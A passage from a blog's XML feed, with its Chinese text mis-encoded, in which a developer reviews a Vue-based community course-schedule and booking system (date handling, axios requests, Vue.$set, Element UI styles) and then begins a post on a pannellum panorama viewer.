class="built_in">this</span>.fourthMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(wedDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// è·å–è¿™å‘¨å››çš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.thuDayTime = thuDayTime;</span><br><span class="line">  <span class="built_in">this</span>.fifthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(thuDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.fifthMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(thuDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// è·å–è¿™å‘¨äº”çš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.friDayTime = friDayTime;</span><br><span class="line">  <span class="built_in">this</span>.sixthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(friDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.sixthMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(friDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// è·å–è¿™å‘¨å…­çš„æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="built_in">this</span>.satDayTime = satDayTime;</span><br><span class="line">  <span class="built_in">this</span>.seventhDay = <span class="keyword">new</span> <span class="built_in">Date</span>(satDayTime).getDate();</span><br><span class="line">  <span class="built_in">this</span>.seventhMonth = <span class="keyword">new</span> <span class="built_in">Date</span>(satDayTime).getMonth() + <span class="number">1</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>ä¼˜åŒ–ï¼šå°† 24 * 60 * 60 * 1000 å®šä¹‰ä¸ºå¸¸é‡ï¼Œè¡¨ç¤ºä¸€å¤©çš„æ—¶é—´æˆ³é•¿åº¦</p><h2 id="ä¸ƒã€æ˜¾ç¤ºè¯¾è¡¨æ•°æ®ï¼š"><a href="#ä¸ƒã€æ˜¾ç¤ºè¯¾è¡¨æ•°æ®ï¼š" class="headerlink" title="ä¸ƒã€æ˜¾ç¤ºè¯¾è¡¨æ•°æ®ï¼š"></a>ä¸ƒã€æ˜¾ç¤ºè¯¾è¡¨æ•°æ®ï¼š</h2><p>ç”±äºæ¥å£è¿”å›çš„åªæ˜¯ä¸€å‘¨å†…å·²æœ‰çš„è¯¾ç¨‹åˆ—è¡¨ï¼Œå¹¶æ²¡æœ‰å…·ä½“å¯¹åº”åœ¨ç¬¬å‡ å¤©ç¬¬å‡ èŠ‚ã€‚å› æ­¤å‰ç«¯éœ€è¦åˆ¤æ–­æ¯èŠ‚è¯¾åœ¨è¯¾è¡¨çš„ä½ç½®ã€‚</p><h2 id="å®ç°æ–¹æ¡ˆ-3"><a href="#å®ç°æ–¹æ¡ˆ-3" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>ä½¿ç”¨åŒé‡å¾ªç¯åˆ¤æ–­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getMultiClass</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/lesson/queryMultiLessonArrangement&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="comment">// å‘¨æ—¥å¼€å§‹åˆ°å‘¨å…­ä¸ºä¸€å‘¨</span></span><br><span class="line">      <span class="attr">beginTime</span>: <span class="built_in">this</span>.sunDayTime,</span><br><span class="line">      <span class="attr">endTime</span>: <span class="built_in">this</span>.satDayTime + <span class="number">86400000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> data = res.data;</span><br><span class="line">      <span class="keyword">if</span> (data.success) &#123;</span><br><span class="line">        <span class="comment">// lessonsList æ˜¯ä¸€å‘¨å†…çš„è¯¾è¡¨</span></span><br><span class="line">        <span class="built_in">this</span>.lessonsList = data.data;</span><br><span class="line">        <span class="comment">// å…ˆåˆå§‹åŒ– classWeekList ï¼Œå†æ›´æ–°æ¯ä¸€ä¸ª classDayList ä¸­çš„è¯¾ç¨‹</span></span><br><span class="line">        <span class="built_in">this</span>.clearWeekClass();</span><br><span class="line">        <span class="built_in">this</span>.getClassDayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.classWeekList.length; i++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; <span class="built_in">this</span>.classWeekList[i].classDayList.length;j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> item = <span class="built_in">this</span>.classWeekList[i].classDayList[j];</span><br><span class="line">            <span class="comment">// item.id ä¸ä¸ºç©ºä»£è¡¨æœ‰è¯¾ï¼Œå¦åˆ™å°±æ˜¯é»˜è®¤çš„ &quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (item.id !== <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">              <span class="comment">// å¾—åˆ°æ¯èŠ‚è¯¾çš„é¢œè‰²</span></span><br><span class="line">              <span class="built_in">this</span>.getLessonRgb(item);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">getClassDayList</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.lessonsList.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> day = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">this</span>.lessonsList[i].beginTime).getDay();</span><br><span class="line">    <span class="keyword">var</span> hour = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">this</span>.lessonsList[i].beginTime).getHours();</span><br><span class="line">    <span class="comment">// æ€»çš„æ€è·¯å°±æ˜¯æ ¹æ®æ—¶é—´(hour)åˆ¤æ–­ï¼Œå¹¶é€šè¿‡å‘¨å‡ (day)èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">0</span> &amp;&amp; hour &lt; <span class="number">9</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">0</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">9</span> &amp;&amp; hour &lt; <span class="number">12</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">1</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">12</span> &amp;&amp; hour &lt; <span class="number">16</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">2</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">16</span> &amp;&amp; hour &lt; <span class="number">19</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">3</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> hour &gt;= <span class="number">19</span> &amp;&amp; hour &lt; <span class="number">24</span>:</span><br><span class="line">        <span class="built_in">this</span>.classWeekList[day].classDayList[<span class="number">4</span>] = <span class="built_in">this</span>.lessonsList[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="å…«ã€è¯¾è¡¨ä¸­çš„é¢œè‰²æ˜¾ç¤º"><a href="#å…«ã€è¯¾è¡¨ä¸­çš„é¢œè‰²æ˜¾ç¤º" class="headerlink" title="å…«ã€è¯¾è¡¨ä¸­çš„é¢œè‰²æ˜¾ç¤º"></a>å…«ã€è¯¾è¡¨ä¸­çš„é¢œè‰²æ˜¾ç¤º</h2><p>ç”±äºåå°è¿”å›çš„æ•°æ®ä¸­æ²¡æœ‰è¯¾ç¨‹çš„ rgb å±æ€§ï¼Œå› æ­¤éœ€è¦æ ¹æ®è¯¾ç¨‹idå†æŸ¥è¯¢è¯¾ç¨‹çš„é¢œè‰²ã€‚åŸå‹å¦‚ä¸‹ï¼š<img src="https://i.loli.net/2021/07/24/oauc8rWjXz6spUD.png" alt="2021033113003059.png"></p><p>èµ·åˆæƒ³åˆ©ç”¨åŒå‘ç»‘å®šï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:style</span>=<span class="string">&quot;&#123; color: &#x27;#&#x27; + item.rgb &#125;&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; item.name &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">item.rgb = res.data.data.rgb</span><br></pre></td></tr></table></figure><p>ä½†è¿™æ ·ä¼šå­˜åœ¨ <strong>æœ€åˆé¡µé¢æ¸²æŸ“å®Œåï¼Œè¯¾ç¨‹é¢œè‰²ä¸ä¼šæ”¹å˜</strong> çš„ bug ï¼Œç”±äºå¼‚æ­¥çš„åŸå› ï¼Œitem.rgb ä¼šåœ¨é¡µé¢åˆ·æ–°å®Œåèµ‹å€¼ï¼Œå› æ­¤åŒå‘ç»‘å®šä¹Ÿå°±æ— æ³•ç¬¬ä¸€æ—¶é—´å®Œæˆï¼Ÿ</p><h2 id="å®ç°æ–¹æ¡ˆ-4"><a href="#å®ç°æ–¹æ¡ˆ-4" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>å‘å­¦é•¿è¯·æ•™åå¾—çŸ¥ï¼Œ<strong>å¯¹è±¡åœ¨åŒå‘ç»‘å®šä¸­æ— æ³•è¢«ç›‘å¬åˆ°ï¼Œæ‰€ä»¥è¦ç”¨Vue.$set</strong> ã€‚</p><p><a href="https://www.jianshu.com/p/71b1807b1815">https://www.jianshu.com/p/71b1807b1815</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">getLessonRgb</span>(<span class="params">item</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$axios(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/Ecommunity/lesson/queryLessonDetail&quot;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">lessonId</span>: item.lessonId,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">    .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      Vue.$set(item,<span class="string">&#x27;rgb&#x27;</span>,res.data.data.rgb);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="ä¹ã€ä¿®æ”¹-Element-UI-çš„æ ·å¼"><a href="#ä¹ã€ä¿®æ”¹-Element-UI-çš„æ ·å¼" class="headerlink" title="ä¹ã€ä¿®æ”¹ Element UI çš„æ ·å¼"></a>ä¹ã€ä¿®æ”¹ Element UI çš„æ ·å¼</h2><p>æœ‰æ—¶ä¼šå‡ºç°åœ¨ style scoped é‡Œä¿®æ”¹æ ·å¼æ— æ•ˆçš„æƒ…å†µï¼Œæ­¤æ—¶å¯å°è¯•å¦èµ·ä¸€ä¸ªstyleï¼Œå…¨å±€ä¿®æ”¹æ ·å¼ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="selector-class">.el-input__inner</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">140px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.el-time-spinner__item</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">35px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="åã€åˆ—è¡¨åˆ¤ç©ºå¤„ç†"><a href="#åã€åˆ—è¡¨åˆ¤ç©ºå¤„ç†" class="headerlink" title="åã€åˆ—è¡¨åˆ¤ç©ºå¤„ç†"></a>åã€åˆ—è¡¨åˆ¤ç©ºå¤„ç†</h2><p>å½“æƒ³å¾ªç¯ä¸€ä¸ªåˆ—è¡¨ä¸­çš„å›¾ç‰‡æ—¶ï¼Œä¸€å®šè¦å…ˆè¿›è¡Œåˆ¤ç©ºå¤„ç†ï¼Œä¸ç„¶<strong>å¯èƒ½</strong>ä¼šå‡ºç° xxx â€œnullâ€ çš„æŠ¥é”™ï¼ï¼ˆåå°æ²¡æœ‰å›¾ç‰‡æ•°æ®ï¼Œå› æ­¤ imageUrls[i] ä¹Ÿæ²¡æœ‰photoUrlå±æ€§ï¼‰</p><p><img src="https://i.loli.net/2021/07/24/sSCOdENUuDWT594.png" alt="20210331132523642.png"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> photoList = [];</span><br><span class="line"><span class="keyword">if</span> (item.imageUrls == <span class="literal">null</span>) &#123;</span><br><span class="line">  photoList = [];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; item.imageUrls.length; i++) &#123;</span><br><span class="line">    photoList.push(item.imageUrls[i].photoUrl);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åä¸€ã€ä»£ç å¤ç”¨æ€§"><a href="#åä¸€ã€ä»£ç å¤ç”¨æ€§" class="headerlink" title="åä¸€ã€ä»£ç å¤ç”¨æ€§"></a>åä¸€ã€ä»£ç å¤ç”¨æ€§</h2><p>åœ¨å®ç°è®¢å•æ¨¡å—æ—¶ï¼Œéœ€è¦æ ¹æ®è®¢å•çš„ä¸åŒçŠ¶æ€è¿›å…¥ä¸åŒé¡µé¢ã€‚<img src="https://i.loli.net/2021/07/24/HLkgDz4S96YUEpl.jpg" alt="Snipaste_2021-07-24_17-05-14.jpg"></p><p>å¤§æ¦‚æœ‰4ã€5ç§æƒ…å†µï¼Œæ¯ä¸ªé¡µé¢åŸºæœ¬ç±»ä¼¼ï¼Œä½†æ˜¯æœ‰å‡ ä¸ª label å’Œ button çš„åŒºåˆ«ã€‚åˆšå¼€å§‹åšçš„æ—¶å€™è„‘å­ä¸€ç³Šæ¶‚ï¼Œé‡å¤ç”»äº†å¾ˆå¤šé¡µé¢ï¼Œçœ‹çœ‹è·¯ç”±ä¸­çš„å¯¼å…¥å°±æ¸…æ¥šï¼š<img src="https://i.loli.net/2021/07/24/PMo53AxStD9gvc8.png" alt="image.png"></p><p>ä¸¥é‡è¿èƒŒé¡¹ç›®å¼€å‘çš„åŸåˆ™ã€‚</p><p>å…¶å®åªéœ€è¦é€šè¿‡ <code>v-if=&quot;this.infoList.status == &#39;é¢„è®¢æˆåŠŸ&#39;&quot;</code> æ”¹å˜å„ä¸ªå…ƒç´ çš„æ˜¾ç¤ºä¸éšè—ï¼Œä¸€ä¸ª vue æ–‡ä»¶å°±èƒ½å®ç°ã€‚</p><h2 id="æˆ¿æ€æ—¥å†æ¨¡å—"><a href="#æˆ¿æ€æ—¥å†æ¨¡å—" class="headerlink" title="æˆ¿æ€æ—¥å†æ¨¡å—"></a>æˆ¿æ€æ—¥å†æ¨¡å—</h2><p>éœ€è¦å®ç°æ ¹æ®å‰©ä½™æˆ¿é—´æ•°å˜è‰²å’ŒåŠ¨æ€æ˜¾ç¤ºæ—¥å†ã€‚</p><p><img src="https://i.loli.net/2021/07/24/8AJNwaLt91zkysh.png"></p><p>æ˜¯æ ¹æ®åŠ¨æ€ç»‘å®šcssæ ·å¼å®ç°çš„ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in roomList&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;cell&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:class</span>=<span class="string">&quot;chooseBackground(item.availableHouse)&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:class</span>=<span class="string">&quot;chooseTextColor(item.availableHouse)&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-model</span>=<span class="string">&quot;item.availableHouse&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶åˆ©ç”¨ computed è®¡ç®—æ ·å¼ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  <span class="function"><span class="title">chooseTextColor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">//æ ¹æ®å‰©ä½™æˆ¿é—´æ•°é€‰æ‹©æ–‡å­—æ˜¾ç¤ºé¢œè‰²</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">num</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (num &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text-color-green&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">3</span> &amp;&amp; num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text-color-yellow&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;text-color-red&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">chooseBackground</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">//æ ¹æ®å‰©ä½™æˆ¿é—´æ•°é€‰æ‹©æ–¹æ ¼çš„èƒŒæ™¯è‰²</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">num</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (num &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;background-color-normal&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">3</span> &amp;&amp; num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;background-color-yellow&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;background-color-red&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘å¯¹å®éªŒå®¤æ ¡ä¼åˆä½œé¡¹ç›®â€”â€”â€œè´¤å¾—å®¶eç¤¾åŒºå­¦å ‚ç®¡ç†ç³»ç»Ÿâ€çš„å¤ç›˜æ€»ç»“ã€‚é¡¹ç›®æ¥æ‰‹æ—¶é—´å¤§æ¦‚åœ¨2020å¹´12æœˆåº•ï¼Œå¯’å‡æ‹–æ‹–æ‹‰æ‹‰äº†æŒºä¹…ï¼Œæœ€åäº20</summary>
      
    
    
    
    <category term="é¡¹ç›®å¤ç›˜" scheme="http://example.com/categories/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98/"/>
    
    
  </entry>
  
  <entry>
    <title>ã€é¡¹ç›®å¤ç›˜ã€‘â€” â€” åŸºäºpannellumçš„å…¨æ™¯å®ç°</title>
    <link href="http://example.com/2021/07/13/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E5%9F%BA%E4%BA%8Epannellum%E7%9A%84%E5%85%A8%E6%99%AF%E5%AE%9E%E7%8E%B0/"/>
    <id>http://example.com/2021/07/13/%E3%80%90%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%E3%80%91%E2%80%94%20%E2%80%94%20%E5%9F%BA%E4%BA%8Epannellum%E7%9A%84%E5%85%A8%E6%99%AF%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-07-13T20:24:04.000Z</published>
    <updated>2021-09-05T14:21:04.619Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€-amp-èƒŒæ™¯"><a href="#å‰è¨€-amp-èƒŒæ™¯" class="headerlink" title="å‰è¨€&amp;èƒŒæ™¯"></a>å‰è¨€&amp;èƒŒæ™¯</h1><p>æœ¬æ–‡æ˜¯æˆ‘å¯¹å®éªŒå®¤æ ¡ä¼åˆä½œé¡¹ç›®â€”â€”â€œåŸºäºpannellumçš„å…¨æ™¯å®ç°â€çš„å¤ç›˜æ€»ç»“ã€‚ç›®å‰å°šæœªå®Œå…¨å®ç°ç”²æ–¹éœ€æ±‚ï¼Œä½†æ˜¯ç»è¿‡è‡ªå·±ä¸æ–­çš„æ¢ç´¢åå·²ç»å¤§æ¦‚å®Œæˆç°é˜¶æ®µè¦æ±‚ï¼Œæ•…å› æ­¤åšä¸ªæ€»ç»“ã€‚</p><p>ç”±äºå°ç¨‹åºç«¯çš„å…¨æ™¯å®ç°å­˜åœ¨æ˜¾ç¤ºä¸äº†å›¾ç‰‡çš„bugï¼ˆå…·ä½“æƒ…å†µæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼‰ï¼Œæ‰€ä»¥è´Ÿè´£äººå°±å†³å®šè®©webå‰ç«¯åšä¸€ä¸ªVRå…¨æ™¯ç½‘é¡µï¼Œç„¶ååœ¨å°ç¨‹åºä¸­ç”¨webviewæ–¹å¼å¼•å…¥ã€‚é¡¹ç›®å¼€å§‹æ˜¯åœ¨2021å¹´6æœˆä¸­æ—¬ï¼Œæ­£é€¢è€ƒè¯•å‘¨ï¼Œå› æ­¤ç›´åˆ°7.10è€ƒå®Œï¼Œåœ¨7.14æ‰å¤§è‡´å®Œå·¥ï¼ˆä»æœ‰ä¸€äº›bugï¼‰ã€‚å‰ç«¯å…¨æ™¯ç½‘é¡µå®ç°é‡‡ç”¨äº†åŸºäºWebGLå’ŒJavaScriptçš„pannellumå¼€æºå…¨æ™¯ç»„ä»¶ã€‚</p><p><a href="https://kssmtjyrkb.feishu.cn/docs/doccnrBkePY1Nakja4wB1jmGhxh#">é¡¹ç›®æ€»ç»“</a></p><h1 id="é¡¹ç›®ç®€ä»‹"><a href="#é¡¹ç›®ç®€ä»‹" class="headerlink" title="é¡¹ç›®ç®€ä»‹"></a>é¡¹ç›®ç®€ä»‹</h1><p>è¯¥é¡¹ç›®ä¸»è¦æ˜¯ä¸ºäº†åœ¨å®¢æˆ·ä¹°æˆ¿æ—¶æœ‰æ›´å¥½çš„è§†è§‰ä½“éªŒï¼Œä»è€Œåˆ¶ä½œäº†ä¸€ä¸ªå…¨æ™¯çœ‹æˆ¿ç½‘é¡µã€‚ä¸»è¦åŠŸèƒ½æœ‰ç‚¹å‡»çƒ­ç‚¹è¿›è¡Œåœºæ™¯çš„åˆ‡æ¢ã€ç‚¹å‡»æŒ‰é’®å‡ºç°ä¸€äºŒçº§åˆ—è¡¨ä»è€Œè¿›è¡Œè·³è·ƒå¼åœºæ™¯åˆ‡æ¢ã€‚</p><h1 id="é‡åˆ°çš„é—®é¢˜ï¼ˆéœ€è¦åšçš„äº‹ï¼‰"><a href="#é‡åˆ°çš„é—®é¢˜ï¼ˆéœ€è¦åšçš„äº‹ï¼‰" class="headerlink" title="é‡åˆ°çš„é—®é¢˜ï¼ˆéœ€è¦åšçš„äº‹ï¼‰"></a>é‡åˆ°çš„é—®é¢˜ï¼ˆéœ€è¦åšçš„äº‹ï¼‰</h1><h2 id="ä¸€ã€ç‚¹å‡»åˆ—è¡¨å®ç°åœºæ™¯åˆ‡æ¢"><a href="#ä¸€ã€ç‚¹å‡»åˆ—è¡¨å®ç°åœºæ™¯åˆ‡æ¢" class="headerlink" title="ä¸€ã€ç‚¹å‡»åˆ—è¡¨å®ç°åœºæ™¯åˆ‡æ¢"></a>ä¸€ã€ç‚¹å‡»åˆ—è¡¨å®ç°åœºæ™¯åˆ‡æ¢</h2><p>åŸºäºå¯¹<a href="https://pannellum.org/documentation/api/">pannellumå®˜ç½‘</a>çš„å­¦ä¹ ï¼Œæœ€åˆæ‰“ç®—ä»¥åŸç”Ÿjavascriptçš„æ–¹å¼å®ç°è¯¥ç½‘é¡µï¼Œæœ€ç»ˆçš„å®ç°æ•ˆæœå¦‚ä¸‹å›¾ï¼šï¼ˆåˆ—è¡¨æ˜¯é€šè¿‡ç‚¹å‡»å·¦ä¸‹è§’æŒ‰é’®å‡ºç°çš„ï¼‰</p><p><img src="https://i.loli.net/2021/07/14/1GRyF7J8LsOWCuU.jpg" alt="QQå›¾ç‰‡20210714211541.jpg"></p><p>ä½†æ˜¯è¿™é‡Œæˆ‘åªæ˜¯åœ¨jsä»£ç ä¸­é€šè¿‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pannellum.viewer(<span class="string">&#x27;panorama&#x27;</span>, &#123;</span><br><span class="line"><span class="string">&quot;default&quot;</span>: &#123;...&#125;ï¼Œ</span><br><span class="line"><span class="string">&quot;scenes&quot;</span>: &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯ä¸Šå›¾ä¸­çš„èƒŒæ™¯ï¼‰ï¼Œåˆ©ç”¨scenesä¸­çš„ä¸åŒå¯¹è±¡å®ç°ä¸åŒçš„åœºæ™¯ï¼Œåˆ©ç”¨hotSpotsè¿›è¡Œåœºæ™¯é—´åˆ‡æ¢ã€‚ç®€å•æ”¾ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scenes&quot;</span>: &#123;</span><br><span class="line">    <span class="comment">//ä¸€ä¸ªåœºæ™¯</span></span><br><span class="line">        <span class="string">&quot;scene1&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hfov&quot;</span>: <span class="number">30</span>, </span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">//çƒ­ç‚¹è·³è½¬</span></span><br><span class="line">            <span class="string">&quot;hotSpots&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">10</span>, <span class="comment">// ä¸Šä¸‹ 0,0é»˜è®¤ä¸­å¿ƒ</span></span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">0</span>, <span class="comment">// å·¦å³</span></span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>, <span class="comment">// åˆ‡æ¢çƒ­ç‚¹ç±»å‹</span></span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;scene2&quot;</span>, </span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;scene2&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hfov&quot;</span>: <span class="number">30</span>,</span><br><span class="line">            ...</span><br><span class="line">            <span class="string">&quot;hotSpots&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;hfov&quot;</span>: <span 